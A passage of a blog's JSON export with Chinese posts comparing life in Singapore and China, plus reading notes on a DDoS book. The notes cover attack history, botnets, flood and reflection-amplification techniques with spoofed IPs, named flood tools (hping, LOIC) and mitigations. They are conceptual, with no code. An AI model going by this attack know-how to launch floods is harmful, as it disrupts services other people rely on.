我每天回家，都在想，如果我回到国内生活，我要花多少钱才能买到同样环境的房子，亦或者说，即便我有钱，恐怕都买不到如此好的环境。\n\n新加坡的公寓就更不用说了，公寓一般楼下都配有游泳池的，有的还有健身房。想游泳或者健身的时候，下楼来就可以了。\n\n这样的房子，价格换成人民币，按绝对数字来比较，比北京深圳贵不到哪里去，大家都是几百万的级别，但质量和环境，就相差十万八千里了。\n\n在腾讯上班的时候，公司旁边是帝景园。有的时候走到茶水间，向外眺望，就能看到楼外的阳台上，挂着白布黑字。上面写着“墙歪楼裂，危在旦夕”之类的，我没有细看，因为角度原因很多地方看不清楚。总之，大意就是房子质量有问题，被坑了。记得实习的时候就挂着这样的白布，一年过后来正式入职了，白布依然在挂着。\n\n从实习到正式工作，两年了，看到这些白布标语，我想过两件事：\n\n一件是，你们挂给谁看呢？给官员看？很明显，官员是不看的，看了也是不管的；给路人看？路人帮不到你们；给买房者看？或许吧，可以避免更多人上当。其实我想，他们自己也不知道挂给谁看，或者说，是挂给自己看的。因为除了贴这样的横幅宣泄怒气和怨气，以获得些许的心理安慰，他们再也没有什么方法来维权了，这种挂横幅的方式，只能体现百姓没有话语权的无力感。\n\n另一件是：如果我买了这样的房子会怎样？在深圳，像样的房子怎么也得几百万级别，人生能赚到几个几百万？说是半生财富亦不为过。如果说耗费半生财富，就买到这样一间有问题的房子，我会怎样？我想象不出来，总之，我不敢想，因为我根本接受不了。98\n年朱总站在九江大堤，大骂“豆腐渣工程，王八蛋工程”，大堤都可以这样，房子会幸免？总之，我不相信哪幢房子，哪座楼盘真的质量过硬，没有偷工减料。退一万步讲，即便质量真的没问题又如何，上哪里去找如我曾租住的那样曲径通幽的环境。\n\n同样的做房奴，我为什么不去国外做。同样的还半生房贷。在北上广可以得到一个鸽子窝，或许还是豆腐渣的鸽子窝；在新加坡可以得到一个泳池公寓；在日本可以得到一个一户建；在欧美可以得到一个别墅，门前自带大花园。同样的付出，不同的回报，事实上，连付出都不同样，因为按购买力算，以人家的收入买房子比国内容易太多。得到的也有区别，无论日本还是欧美，房子下面的那块地皮，永远是你的。如此衡量，我没有任何留下的理由。\n\n新加坡的组屋，很便宜，但有一个小坑，就是 PR\n才可以买二手组屋，外国人只能买公寓。一手的组屋新房，应该是只有本国人才可以买。也就是说，新加坡人凭借自己的国籍优势，买个组屋转手再卖，直接就能获利数十万甚至上百万。可以看到，政府对本国居民利益的保护，甚至是赤裸裸地偏向。\n\n这边的公寓还有另外一个特点，就是基本都带有佣人房，佣人房一般都在厨房的后边，是专门给佣人居住的。对新加坡的中产家庭来说，雇佣一个女佣，并不是什么难事。每个月几百块钱而已。主要是菲律宾、印尼等等地方的佣人，菲佣貌似价格贵一些。不得不感叹，真“腐朽”。\n\n交通\n新加坡开车的成本很高，因为拥车证很昂贵，并且拥车证还有期限。但是公共交通很发达，舒适。新加坡的马路上是没有交警的，我十分怀疑，他们是否有交警这个职业。这样一个弹丸之地，几乎看不到堵车，因为几乎没有抢道的情况。他们对于马路拥堵的感觉似乎就是，时速\n20 公里/时，就是有点堵了。\n\n刚到这里的时候，十分不习惯，因为过马路的时候，尤其是过斑马线的时候，习惯性地让汽车先过，看到汽车远远开过来，都会下意识地停在路边等它过去。然而，这里的剧情是，汽车会直接停下来，等你过去。花了好长时间，才习惯看到汽车开过来之后，不管它，大胆地往前走。\n\n这里坐地铁也好，坐公交也罢，最大的感觉就是很舒服，很方便，在这里生活，我并没有买一辆车的欲望。记得多年以前，有专家谈到北京拥堵，提到的是，先要把公共交通建设好，让人们使用公共交通的时候，感觉到有尊严。我在这里乘地铁或者公交，并不觉得无趣，看看窗外的风景，时间很快就过去了，并且噪音很小，空气清新，速度也快，总而言之吧，我无法说清专家嘴里的尊严到底是什么，但我觉得，这里的公共交通，就是专家说的，该有的感觉。\n\n我们的确也有公共交通，大城市的公共交通也不能说不发达，但是仅仅是有而已，要是说到便捷、舒适、有尊严。乘坐公共交通也有不输于使用私家车的生活品质，还有太长的路要走。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-08T12:48:27.000Z","created_by":"1","updated_at":"2015-12-10T02:49:36.000Z","updated_by":"1","published_at":"2015-12-09T12:54:36.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c4b","uuid":"0d5b5df6-2dcc-4b7b-b75d-82d73c9375d1","title":"在新加坡的所见所感（三）","slug":"singapore3","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![height=\\\"300px\\\" width=\\\"400px\\\"](/content/images/2015/12/beijing.jpg)\\n\\n写点杂七杂八的，观察到的有意思的细节。\\n\\n在学校里面做 RA 的时候，慢慢发现行政人员基本都在岗位上。上了这么多年学，已经习惯了去找行政人员办事，十次有八次找不到人的情况。然而，在这里，几乎没有找不到人的时候，只要是上班时间，到了行政人员办公室，他们基本都在座位上，即便找不到人，也会有代理人帮你把事情办好，不能说绝对不会吧，但起码在我的经历里面，没有出现过办一件事跑第二次，或者来回跑的情况，办事效率，行政效率，不是一般的高。\\n\\n坐地铁的时候，观察周围，发现 Kindle 的普及率很高，每天都可以看到拿 Kindle 看书的人，也可以看到拿纸质书阅读的人。他们普遍有阅读的习惯，虽然有不少人是在用手机玩消除类的游戏打发时间，但也有相当比例的人在阅读，读 Kindle、手机电子书、纸质书，甚至是免费的报纸。苹果手机的普及率也很高，在 12 年的时候，苹果在国内还不是街机，但在新加坡的地铁里，我粗略观察，基本 10 个人里面 7 个人拿着苹果，剩下两三个拿的是黑莓或者三星。当我掏出 2.5 寸屏的诺基亚直板机的时候，地铁里就出现了唯一的诺基亚用户。\\n\\n麦当劳肯德基之类的，没有单独的门脸，只是大商场里面的一个商铺；银行也很少看到独立盖的网点，基本也是大商场里面的一个格子间。银行柜台没有防弹玻璃隔开，甚至根本就没有柜台，办事情就坐在工作人员的旁边。\\n\\n这里有很多补品类的药铺，有点像香港。有大量的人参、鹿茸之类的出售。普通的小超市，可以看到各种从国内进口的优质农产品，这些东西放到国内，基本都要进高档超市的。然而在这里，就是普通人消费的很廉价的东西。我的工资是每月 2000 新币，超市的盐是 5 毛一带，橄榄油 10 块多一瓶，一桶油、一袋米面，也没几个钱。50 块的钞票是生活中的大票，功能和我们的百元钞一样，100 面值的新币几乎看不见流通，只有离开新加坡的时候在银行取到过，那是我第一次见到 100 的钞票。\\n\\n大部分人都在外面吃饭，食阁很发达，随便找个地方吃，就十分好吃。或许这是移民国家的特点吧，各个地方的移民，带来了各个地方独特的美食。食阁的饭，大体有杂菜饭（类似学校食堂，自选饭菜）、福建面、炒粿条、老火靓汤、烧腊、马来饭菜、印度饭菜、越南饭菜等等。吃腻了可以去街边小店吃泰国菜、娘惹菜、日料等等。似乎政府特别鼓励大家在外面吃，是否真的鼓励并没有考证过，但个人感觉，随便找个地方都很好吃，而且便宜，真的不值得在家开火。另外就是，这里的房间没有油烟机的烟道，所以除非是自己买的房子，否则一般情况下，不允许租客用中式的煎炒烹炸那种方法“大煮”，即便是自己买的房子，因为没有烟道，估计也忍不了这样做饭吧。\\n\\n最关键的是，我一日三餐在外面吃，饭量比别人大，吃的多，各种吃，租的房子也比较好，即便这样，每月消费也就一千二三，两千的工资还能剩七八百。更为关键的是，我这是低收入，新加坡人的平均收入是四五千，生活水平可想而知。\\n\\n电子产品包括家电，品牌格局和国内不同，比如这里经常见到松下的空调，也有很多日系品牌的其他家电出售，国内品牌很少见到，或者说，根本没有。笔记本电脑卖宏碁的特别多，联想也占有一席之地，然后华硕也有卖，其余国内能看到的品牌都很少见到。最常见的基本都是日系和欧美的家电。真正在这里有自己一块地方的，应该就是联想和海尔吧。\\n\\n人们的心态很好，我觉得这是我最喜欢的一点，简而言之就是没有戾气，不躁。在这里一年了，没看到过谁急急火火。没看到过交通事故，没看到过吵架，没听说过大妈逼人让座，最常听到的词是 sorry。我没看到过不代表没有，但是总有个多与少的问题，总体上看，人们的心态真的是很平和，在这样的环境里生活，整个人感觉很放松，不累。\\n\\n动物园的动物非常自由，如果谁来新加坡旅游，我一般都会推荐他去逛一逛动物园，真是设计的非常非常好。猴子就从你头顶上过去，鸟在树上蹲着，动物们都很自由，几乎没有铁笼子，他们是用人工的河流把动物圈在一块地方，非常自然。有很多那种类似大雁的鸟，他们的窝就在大树的最顶端，我还问了工作人员，你们这样撒着，这些动物跑了怎么办。然后人家的回答是，他们往哪里跑，他们的家在这里，为啥要跑呀？我去。。。听起来真是好有道理，感觉也是无言以对。逛完动物园出来，我有点儿感叹，不光是人，连动物投胎都是个技术活儿。\\n\\n逛动物园的时候，这只鸟（某种鸽子？）蹲在树上呆着，一点儿不怕人，坐看来来往往的游客。没有笼子，没有铭牌，到现在也不知道它是什么。\\n\\n![](/content/images/2015/12/dongwu1.jpg)\\n\\n偶尔会在树上看到松鼠，这里的松鼠比北美还是少多了，但在动物园碰到的概率还是很高的，松鼠没人管，蹿的特别快，拍照片很不容易。\\n\\n![](/content/images/2015/12/dongwu2.jpg)\\n![](/content/images/2015/12/dongwu3.jpg)\\n\\n在去新加坡植物园玩儿的时候，里面有一个小小的湖泊，然后居然有只黑天鹅。嗯，是在植物园，然后有一只没人管的黑天鹅，也不怕人，从没这么近距离地看过黑天鹅。左下角那个黑黑的东西不是石头，而是一只大乌龟，水很浅很清，里面好多龟。\\n\\n![](/content/images/2015/12/dongwu4.jpg)\\n\\n在去河川动物园的时候，在门口售票处看到一只出来溜达的孔雀，然后就比较震精，这是在外面啊。还没进园呢。然后问工作人员它怎么在外面，然后工作人员说它自己喜欢出来溜溜，一会儿就溜达回去了。然后我也是比较无语，我刚想问一句它要是跑了怎么办，想想还是算了，估计人家又会回答它的家在这里，为啥要跑。\\n\\n![](/content/images/2015/12/dongwu5.jpg)\\n\\n新加坡有没有不好的地方呢，自然也有。比如其实也不是那么自由，毕竟是威权；比如对外国人的政策真是比较苛刻，处处能感受到 PR 和本地人身份的便利；比如对中国人其实不是那么友好；比如也面临着人才流失，大量的优秀学生拿这里当跳板，去了北美，去了澳洲，总之，各种各样的问题也有，哪个国家没有问题，有人的地方就有利益，就有矛盾，就有问题。\\n\\n没有什么地方是最好的，适合自己的地方就是最好的。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><img src=\"/content/images/2015/12/beijing.jpg\" alt=\"height=&quot;300px&quot; width=&quot;400px&quot;\"></p>\n<p>写点杂七杂八的，观察到的有意思的细节。</p>\n<p>在学校里面做 RA 的时候，慢慢发现行政人员基本都在岗位上。上了这么多年学，已经习惯了去找行政人员办事，十次有八次找不到人的情况。然而，在这里，几乎没有找不到人的时候，只要是上班时间，到了行政人员办公室，他们基本都在座位上，即便找不到人，也会有代理人帮你把事情办好，不能说绝对不会吧，但起码在我的经历里面，没有出现过办一件事跑第二次，或者来回跑的情况，办事效率，行政效率，不是一般的高。</p>\n<p>坐地铁的时候，观察周围，发现 Kindle 的普及率很高，每天都可以看到拿 Kindle 看书的人，也可以看到拿纸质书阅读的人。他们普遍有阅读的习惯，虽然有不少人是在用手机玩消除类的游戏打发时间，但也有相当比例的人在阅读，读 Kindle、手机电子书、纸质书，甚至是免费的报纸。苹果手机的普及率也很高，在 12 年的时候，苹果在国内还不是街机，但在新加坡的地铁里，我粗略观察，基本 10 个人里面 7 个人拿着苹果，剩下两三个拿的是黑莓或者三星。当我掏出 2.5 寸屏的诺基亚直板机的时候，地铁里就出现了唯一的诺基亚用户。</p>\n<p>麦当劳肯德基之类的，没有单独的门脸，只是大商场里面的一个商铺；银行也很少看到独立盖的网点，基本也是大商场里面的一个格子间。银行柜台没有防弹玻璃隔开，甚至根本就没有柜台，办事情就坐在工作人员的旁边。</p>\n<p>这里有很多补品类的药铺，有点像香港。有大量的人参、鹿茸之类的出售。普通的小超市，可以看到各种从国内进口的优质农产品，这些东西放到国内，基本都要进高档超市的。然而在这里，就是普通人消费的很廉价的东西。我的工资是每月 2000 新币，超市的盐是 5 毛一带，橄榄油 10 块多一瓶，一桶油、一袋米面，也没几个钱。50 块的钞票是生活中的大票，功能和我们的百元钞一样，100 面值的新币几乎看不见流通，只有离开新加坡的时候在银行取到过，那是我第一次见到 100 的钞票。</p>\n<p>大部分人都在外面吃饭，食阁很发达，随便找个地方吃，就十分好吃。或许这是移民国家的特点吧，各个地方的移民，带来了各个地方独特的美食。食阁的饭，大体有杂菜饭（类似学校食堂，自选饭菜）、福建面、炒粿条、老火靓汤、烧腊、马来饭菜、印度饭菜、越南饭菜等等。吃腻了可以去街边小店吃泰国菜、娘惹菜、日料等等。似乎政府特别鼓励大家在外面吃，是否真的鼓励并没有考证过，但个人感觉，随便找个地方都很好吃，而且便宜，真的不值得在家开火。另外就是，这里的房间没有油烟机的烟道，所以除非是自己买的房子，否则一般情况下，不允许租客用中式的煎炒烹炸那种方法“大煮”，即便是自己买的房子，因为没有烟道，估计也忍不了这样做饭吧。</p>\n<p>最关键的是，我一日三餐在外面吃，饭量比别人大，吃的多，各种吃，租的房子也比较好，即便这样，每月消费也就一千二三，两千的工资还能剩七八百。更为关键的是，我这是低收入，新加坡人的平均收入是四五千，生活水平可想而知。</p>\n<p>电子产品包括家电，品牌格局和国内不同，比如这里经常见到松下的空调，也有很多日系品牌的其他家电出售，国内品牌很少见到，或者说，根本没有。笔记本电脑卖宏碁的特别多，联想也占有一席之地，然后华硕也有卖，其余国内能看到的品牌都很少见到。最常见的基本都是日系和欧美的家电。真正在这里有自己一块地方的，应该就是联想和海尔吧。</p>\n<p>人们的心态很好，我觉得这是我最喜欢的一点，简而言之就是没有戾气，不躁。在这里一年了，没看到过谁急急火火。没看到过交通事故，没看到过吵架，没听说过大妈逼人让座，最常听到的词是 sorry。我没看到过不代表没有，但是总有个多与少的问题，总体上看，人们的心态真的是很平和，在这样的环境里生活，整个人感觉很放松，不累。</p>\n<p>动物园的动物非常自由，如果谁来新加坡旅游，我一般都会推荐他去逛一逛动物园，真是设计的非常非常好。猴子就从你头顶上过去，鸟在树上蹲着，动物们都很自由，几乎没有铁笼子，他们是用人工的河流把动物圈在一块地方，非常自然。有很多那种类似大雁的鸟，他们的窝就在大树的最顶端，我还问了工作人员，你们这样撒着，这些动物跑了怎么办。然后人家的回答是，他们往哪里跑，他们的家在这里，为啥要跑呀？我去。。。听起来真是好有道理，感觉也是无言以对。逛完动物园出来，我有点儿感叹，不光是人，连动物投胎都是个技术活儿。</p>\n<p>逛动物园的时候，这只鸟（某种鸽子？）蹲在树上呆着，一点儿不怕人，坐看来来往往的游客。没有笼子，没有铭牌，到现在也不知道它是什么。</p>\n<p><img src=\"/content/images/2015/12/dongwu1.jpg\" alt=\"\"></p>\n<p>偶尔会在树上看到松鼠，这里的松鼠比北美还是少多了，但在动物园碰到的概率还是很高的，松鼠没人管，蹿的特别快，拍照片很不容易。</p>\n<p><img src=\"/content/images/2015/12/dongwu2.jpg\" alt=\"\"><br>\n<img src=\"/content/images/2015/12/dongwu3.jpg\" alt=\"\"></p>\n<p>在去新加坡植物园玩儿的时候，里面有一个小小的湖泊，然后居然有只黑天鹅。嗯，是在植物园，然后有一只没人管的黑天鹅，也不怕人，从没这么近距离地看过黑天鹅。左下角那个黑黑的东西不是石头，而是一只大乌龟，水很浅很清，里面好多龟。</p>\n<p><img src=\"/content/images/2015/12/dongwu4.jpg\" alt=\"\"></p>\n<p>在去河川动物园的时候，在门口售票处看到一只出来溜达的孔雀，然后就比较震精，这是在外面啊。还没进园呢。然后问工作人员它怎么在外面，然后工作人员说它自己喜欢出来溜溜，一会儿就溜达回去了。然后我也是比较无语，我刚想问一句它要是跑了怎么办，想想还是算了，估计人家又会回答它的家在这里，为啥要跑。</p>\n<p><img src=\"/content/images/2015/12/dongwu5.jpg\" alt=\"\"></p>\n<p>新加坡有没有不好的地方呢，自然也有。比如其实也不是那么自由，毕竟是威权；比如对外国人的政策真是比较苛刻，处处能感受到 PR 和本地人身份的便利；比如对中国人其实不是那么友好；比如也面临着人才流失，大量的优秀学生拿这里当跳板，去了北美，去了澳洲，总之，各种各样的问题也有，哪个国家没有问题，有人的地方就有利益，就有矛盾，就有问题。</p>\n<p>没有什么地方是最好的，适合自己的地方就是最好的。</p>\n</div>","amp":"23","plaintext":"写点杂七杂八的，观察到的有意思的细节。\n\n在学校里面做 RA\n的时候，慢慢发现行政人员基本都在岗位上。上了这么多年学，已经习惯了去找行政人员办事，十次有八次找不到人的情况。然而，在这里，几乎没有找不到人的时候，只要是上班时间，到了行政人员办公室，他们基本都在座位上，即便找不到人，也会有代理人帮你把事情办好，不能说绝对不会吧，但起码在我的经历里面，没有出现过办一件事跑第二次，或者来回跑的情况，办事效率，行政效率，不是一般的高。\n\n坐地铁的时候，观察周围，发现 Kindle 的普及率很高，每天都可以看到拿 Kindle\n看书的人，也可以看到拿纸质书阅读的人。他们普遍有阅读的习惯，虽然有不少人是在用手机玩消除类的游戏打发时间，但也有相当比例的人在阅读，读\nKindle、手机电子书、纸质书，甚至是免费的报纸。苹果手机的普及率也很高，在 12 年的时候，苹果在国内还不是街机，但在新加坡的地铁里，我粗略观察，基本 10\n个人里面 7 个人拿着苹果，剩下两三个拿的是黑莓或者三星。当我掏出 2.5 寸屏的诺基亚直板机的时候，地铁里就出现了唯一的诺基亚用户。\n\n麦当劳肯德基之类的，没有单独的门脸，只是大商场里面的一个商铺；银行也很少看到独立盖的网点，基本也是大商场里面的一个格子间。银行柜台没有防弹玻璃隔开，甚至根本就没有柜台，办事情就坐在工作人员的旁边。\n\n这里有很多补品类的药铺，有点像香港。有大量的人参、鹿茸之类的出售。普通的小超市，可以看到各种从国内进口的优质农产品，这些东西放到国内，基本都要进高档超市的。然而在这里，就是普通人消费的很廉价的东西。我的工资是每月\n2000 新币，超市的盐是 5 毛一带，橄榄油 10 块多一瓶，一桶油、一袋米面，也没几个钱。50 块的钞票是生活中的大票，功能和我们的百元钞一样，100\n面值的新币几乎看不见流通，只有离开新加坡的时候在银行取到过，那是我第一次见到 100 的钞票。\n\n大部分人都在外面吃饭，食阁很发达，随便找个地方吃，就十分好吃。或许这是移民国家的特点吧，各个地方的移民，带来了各个地方独特的美食。食阁的饭，大体有杂菜饭（类似学校食堂，自选饭菜）、福建面、炒粿条、老火靓汤、烧腊、马来饭菜、印度饭菜、越南饭菜等等。吃腻了可以去街边小店吃泰国菜、娘惹菜、日料等等。似乎政府特别鼓励大家在外面吃，是否真的鼓励并没有考证过，但个人感觉，随便找个地方都很好吃，而且便宜，真的不值得在家开火。另外就是，这里的房间没有油烟机的烟道，所以除非是自己买的房子，否则一般情况下，不允许租客用中式的煎炒烹炸那种方法“大煮”，即便是自己买的房子，因为没有烟道，估计也忍不了这样做饭吧。\n\n最关键的是，我一日三餐在外面吃，饭量比别人大，吃的多，各种吃，租的房子也比较好，即便这样，每月消费也就一千二三，两千的工资还能剩七八百。更为关键的是，我这是低收入，新加坡人的平均收入是四五千，生活水平可想而知。\n\n电子产品包括家电，品牌格局和国内不同，比如这里经常见到松下的空调，也有很多日系品牌的其他家电出售，国内品牌很少见到，或者说，根本没有。笔记本电脑卖宏碁的特别多，联想也占有一席之地，然后华硕也有卖，其余国内能看到的品牌都很少见到。最常见的基本都是日系和欧美的家电。真正在这里有自己一块地方的，应该就是联想和海尔吧。\n\n人们的心态很好，我觉得这是我最喜欢的一点，简而言之就是没有戾气，不躁。在这里一年了，没看到过谁急急火火。没看到过交通事故，没看到过吵架，没听说过大妈逼人让座，最常听到的词是\nsorry。我没看到过不代表没有，但是总有个多与少的问题，总体上看，人们的心态真的是很平和，在这样的环境里生活，整个人感觉很放松，不累。\n\n动物园的动物非常自由，如果谁来新加坡旅游，我一般都会推荐他去逛一逛动物园，真是设计的非常非常好。猴子就从你头顶上过去，鸟在树上蹲着，动物们都很自由，几乎没有铁笼子，他们是用人工的河流把动物圈在一块地方，非常自然。有很多那种类似大雁的鸟，他们的窝就在大树的最顶端，我还问了工作人员，你们这样撒着，这些动物跑了怎么办。然后人家的回答是，他们往哪里跑，他们的家在这里，为啥要跑呀？我去。。。听起来真是好有道理，感觉也是无言以对。逛完动物园出来，我有点儿感叹，不光是人，连动物投胎都是个技术活儿。\n\n逛动物园的时候，这只鸟（某种鸽子？）蹲在树上呆着，一点儿不怕人，坐看来来往往的游客。没有笼子，没有铭牌，到现在也不知道它是什么。\n\n\n\n偶尔会在树上看到松鼠，这里的松鼠比北美还是少多了，但在动物园碰到的概率还是很高的，松鼠没人管，蹿的特别快，拍照片很不容易。\n\n\n\n\n在去新加坡植物园玩儿的时候，里面有一个小小的湖泊，然后居然有只黑天鹅。嗯，是在植物园，然后有一只没人管的黑天鹅，也不怕人，从没这么近距离地看过黑天鹅。左下角那个黑黑的东西不是石头，而是一只大乌龟，水很浅很清，里面好多龟。\n\n\n\n在去河川动物园的时候，在门口售票处看到一只出来溜达的孔雀，然后就比较震精，这是在外面啊。还没进园呢。然后问工作人员它怎么在外面，然后工作人员说它自己喜欢出来溜溜，一会儿就溜达回去了。然后我也是比较无语，我刚想问一句它要是跑了怎么办，想想还是算了，估计人家又会回答它的家在这里，为啥要跑。\n\n\n\n新加坡有没有不好的地方呢，自然也有。比如其实也不是那么自由，毕竟是威权；比如对外国人的政策真是比较苛刻，处处能感受到 PR\n和本地人身份的便利；比如对中国人其实不是那么友好；比如也面临着人才流失，大量的优秀学生拿这里当跳板，去了北美，去了澳洲，总之，各种各样的问题也有，哪个国家没有问题，有人的地方就有利益，就有矛盾，就有问题。\n\n没有什么地方是最好的，适合自己的地方就是最好的。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-09T13:23:33.000Z","created_by":"1","updated_at":"2016-04-08T06:39:22.000Z","updated_by":"1","published_at":"2015-12-10T12:39:37.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c4c","uuid":"21129867-6046-4a3f-8e2f-5aff4b877eaf","title":"DDoS 攻击与防范读书笔记","slug":"ddosnote","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##DDoS 的历史\\n\\n* 1996 年 9 月 6 日，Panix 遭遇 SYN FLOOD\\n* 1996 年 9 月 19 日，CERT 发布“CA-1996-21”，提出缓解 SYN FLOOD 和 IP 欺骗攻击的建议。\\n* 1997 年，Trinoo 攻击工具发布，SMURF 源码发布\\n* 2000 年，Yahoo 遭遇 DDoS，攻击者是黑手党男孩\\n* 2000 年，IETF 发布 RFC 2827，\\\"Network Ingress Filtering：Defeating Denial of Service Attacks which employ IP Source Address Spoofing\\\"\\n* 2001 年，IRC 服务 EFNet 遭到 3 Gbits/s DDoS 攻击\\n* 2002 年，13 台根域名服务器受攻击\\n\\n......\\n\\n* 2010 年，Anonymous 宣布开展阿桑奇复仇行动\\n* 2011 年，CIA 网站遭到 LulzSec 的 DDoS\\n* 2013 年，Spamhaus 受到史上最大规模 DDoS，峰值 300 Gbits/s\\n* 2013 年，互联网系统协会宣布在新版 BIND 中增加 RRL 模块用来防范 DDoS\\n\\n## DDoS 的攻击来源\\n\\n绝大多数攻击来源于僵尸网络（Botnet），书中主要介绍了僵尸网络的演化。僵尸网络最早可追溯到 IRC 的 Bot 工具 Eggdrop，这是个良性 Bot。这种 Bot 启发了黑客的思路，进而产生了僵尸网络，并一发不可收拾。\\n\\n根据僵尸网络所依赖的协议，其演进流程从 IRC 到 HTTP 再到 P2P，Zeus 为典型的 HTTP 僵尸网络，主机感染数量庞大的 Zeroaccess 为 P2P 僵尸网络。\\n\\nZeus 的泄露对互联网影响深远，目前有黑客为 Zeus 添加了 P2P 模块。另外，目前以互联网中的高性能服务器作为 Bot 的趋势正在上升，因为受感染的服务器无论在系统资源，在线时间等各方面，都优于传统 PC，移动设备作为僵尸机也是一个趋势。\\n\\n利用僵尸网络进行 DDoS 的基本原理如图所示。\\n\\n![](/content/images/2016/01/botnet.JPG)\\n\\n最后，Anonymous 组织基于黑客行动主义，采用十分特殊的自愿型僵尸网络，即由大量的人在同一时间，有意识地组成僵尸网络，使用工具对目标进行攻击。\\n\\n## DDoS 的攻击方法\\nDDoS 攻击主要有以下几大类：攻击带宽资源、攻击系统资源、攻击应用资源，目前常见的反射攻击，属于攻击带宽。\\n###攻击带宽资源\\n####直接攻击\\n1. ICMP/IGMP Flood\\n攻击者向目标发送大量 ICMP/IGMP 报文，用来消耗目标的带宽资源，可以使用 hping 等工具发起此类攻击，但被攻击目标可以在网络边界直接过滤此类攻击包，所以目前很少使用，也没什么效果。\\n\\n2. UDP Flood\\n攻击原理与 ICMP 相同，攻击者发送大量 UDP 包来消耗目标的带宽资源。UDP Flood 攻击可以分为小包攻击和大包攻击。小包是 64B，这样可以增大 pps，给对方网络设备增加压力；大包是大于 1500B 的数据包，能有效占用带宽，并且逼迫对方做分片重组运算，拖慢响应。\\nUDP Flood 历史悠久，hping，LOIC 等工具可以发动此攻击，对自身的消耗大，对对方的消耗不大。\\n####反射攻击\\n这种攻击称为 DRDoS，主要特点是利用反射流量对目标进行攻击，并隐藏了攻击来源。如果做个比喻的话，原始的 DDoS 是拿机关枪直接打人，而 DRDoS 则是拿机关枪打墙，利用从墙上反弹回的弹壳伤人。\\n\\n在反射攻击中，攻击者将源 IP 伪造成要攻击的目标主机，向反射器发送数据包，而反射器对数据包根据源 IP 进行回复的时候，海量的数据包就发送到了目标主机上，以达到攻击目的。这里面有个关键就是，反射器必须具有放大的作用，即一个较小的请求包，会引发一个较大的回复包，这样攻击者才能以一个较小的请求，反射并放大给目标主机，使目标主机受到攻击，其原理如图所示。\\n\\n![](/content/images/2016/01/drdosyuanli.JPG)\\n\\n***因为反射攻击中源 IP 地址是伪造的，所以攻击者和被攻击者之间无法进行多次交互，因此发动反射攻击通常使用不需要认证或者握手的协议，即绝大多数反射攻击都是基于 UDP 协议的。***\\n\\n###攻击系统资源\\n攻击系统资源不是通过占用带宽，而是通过促使目标主机的系统资源快速消耗，进而拖慢响应速度。包括：TCP Flood，SYN Flood，PSH + ACK Flood，RST Flood，SockStress，THC SSL DoS，SSL Flood\\n###攻击应用资源\\n攻击应用资源包括：DNS Query，DNS NXDOMAIN Flood，HTTP Flood，Slowloris，慢速 POST。\\n\\n最终总结如下：\\n\\n![](/content/images/2016/01/ddossummary.JPG)\\n\\n##DDoS 主要攻击工具\\n![](/content/images/2016/01/ddostool.JPG)\\n\\n##DDoS 的缓解和治理\\n1. 由多方出面，治理僵尸网络，治理反射点。\\n2. CDN 和 Anycast，以及流量稀释和流量清洗。\\n\\n文章参考提取自：《破坏之王：DDoS 攻击与防范深度剖析》\\n\\n其余有用相关资料：\\n\\n1. http://blog.aliyun.com/author/aliyun_blog?spm=0.0.0.0.pQw3zi\\n2. http://blog.nsfocus.net/2015-h1-nsfocus-ddos-threat-report/\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"ddos\">DDoS 的历史</h2>\n<ul>\n<li>1996 年 9 月 6 日，Panix 遭遇 SYN FLOOD</li>\n<li>1996 年 9 月 19 日，CERT 发布“CA-1996-21”，提出缓解 SYN FLOOD 和 IP 欺骗攻击的建议。</li>\n<li>1997 年，Trinoo 攻击工具发布，SMURF 源码发布</li>\n<li>2000 年，Yahoo 遭遇 DDoS，攻击者是黑手党男孩</li>\n<li>2000 年，IETF 发布 RFC 2827，&quot;Network Ingress Filtering：Defeating Denial of Service Attacks which employ IP Source Address Spoofing&quot;</li>\n<li>2001 年，IRC 服务 EFNet 遭到 3 Gbits/s DDoS 攻击</li>\n<li>2002 年，13 台根域名服务器受攻击</li>\n</ul>\n<p>......</p>\n<ul>\n<li>2010 年，Anonymous 宣布开展阿桑奇复仇行动</li>\n<li>2011 年，CIA 网站遭到 LulzSec 的 DDoS</li>\n<li>2013 年，Spamhaus 受到史上最大规模 DDoS，峰值 300 Gbits/s</li>\n<li>2013 年，互联网系统协会宣布在新版 BIND 中增加 RRL 模块用来防范 DDoS</li>\n</ul>\n<h2 id=\"ddos\">DDoS 的攻击来源</h2>\n<p>绝大多数攻击来源于僵尸网络（Botnet），书中主要介绍了僵尸网络的演化。僵尸网络最早可追溯到 IRC 的 Bot 工具 Eggdrop，这是个良性 Bot。这种 Bot 启发了黑客的思路，进而产生了僵尸网络，并一发不可收拾。</p>\n<p>根据僵尸网络所依赖的协议，其演进流程从 IRC 到 HTTP 再到 P2P，Zeus 为典型的 HTTP 僵尸网络，主机感染数量庞大的 Zeroaccess 为 P2P 僵尸网络。</p>\n<p>Zeus 的泄露对互联网影响深远，目前有黑客为 Zeus 添加了 P2P 模块。另外，目前以互联网中的高性能服务器作为 Bot 的趋势正在上升，因为受感染的服务器无论在系统资源，在线时间等各方面，都优于传统 PC，移动设备作为僵尸机也是一个趋势。</p>\n<p>利用僵尸网络进行 DDoS 的基本原理如图所示。</p>\n<p><img src=\"/content/images/2016/01/botnet.JPG\" alt=\"\"></p>\n<p>最后，Anonymous 组织基于黑客行动主义，采用十分特殊的自愿型僵尸网络，即由大量的人在同一时间，有意识地组成僵尸网络，使用工具对目标进行攻击。</p>\n<h2 id=\"ddos\">DDoS 的攻击方法</h2>\n<p>DDoS 